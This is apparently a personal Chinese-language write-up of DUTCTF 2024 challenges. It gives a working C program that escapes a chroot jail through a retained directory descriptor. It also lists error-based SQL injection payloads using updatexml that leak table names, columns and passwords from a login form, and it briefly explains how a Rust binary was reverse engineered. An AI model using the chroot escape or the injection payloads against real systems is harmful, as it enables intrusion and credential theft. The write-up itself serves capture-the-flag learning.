---
title: DUTCTF 2024 Writeup
date: 2024-03-19T10:51:54+08:00
tags: [CTF]
---

### jailbreak

> handout/files/rootfs.cpio 是一个简易的文件系统。 
> 
> 在运行 handout/files/run.sh 后，你将进入一个位于该文件系统 /root/jail/ 路径下的 chrooted jail。
> 
> 你需要逃出该 chrooted jail 读取 /flag。

根据题目描述，使用了 `chroot` 修改了根目录导致无法正常访问根目录下的 flag 文件。可以通过文件描述符来逃脱 jail，然后不断返回上层目录。

```c
#include <fcntl.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
  int fd = open(".", O_RDONLY);
  mkdir("tempdir", 0755);
  if (fd == -1) return 1;
  if (chroot("test") == -1) return 1;
  if (fchdir(fd) == -1) return 1;
  for (int i = 0; i < 10; i++) chdir("..");
  if (chroot(".") == -1) return 1;
  system("cat flag");
  return 0;
}
```

### 数据库初学者

> 小白的java老师上课教了jdbc的使用方式，他立马写了一个登陆系统出来

在登录框尝试输入 `'` 测试，发现发生了报错，可以使用 `updatexml` 来泄漏表信息。

- 获取表信息：`' or updatexml(1,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=database()),30),0x7e),1) or '`
- 获取 users 表信息：`' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) or '`
- 获取 password：`' or updatexml(1,concat(0x7e,right((select group_concat(password) from users),30),0x7e),1) or '`


### 输入flag以获取flag

TODO

### ctf1

> ①思念，爱，或者是缘分?顺着这份联系就一定能找到对方（如果想找到输出函数，可以尝试使用rust编译一份exe并观察输出函数的伪代码实现。即使不使用现代的函数符号识别工具，人类，也能找到那个决定性的特征吧）
> 
> ②rust的println有一个固定的字符串引用，这就是本体中决定性的特征。如果能找到ctf1中的println，对println的交叉引用就是决定的一击
> 
> ③没有学过rust也没有关系，跟随菜鸟教程，来一个rust版的hello world并拖去ida加载pdb文件分析（用debug模式，即默认的cargo run会好一些）


Rust逆向，可以通过 `stdoutlibrary\std\src\io\mod.rs` 和各种报错字符串来找到println函数。之后分析跳rip即可得到flag。

当时没做出来，最后发现因为我跳的rip往下了5行导致某些内存没有初始化发生了错误。以后逆向的时候要注意在目标地址附近多试几次。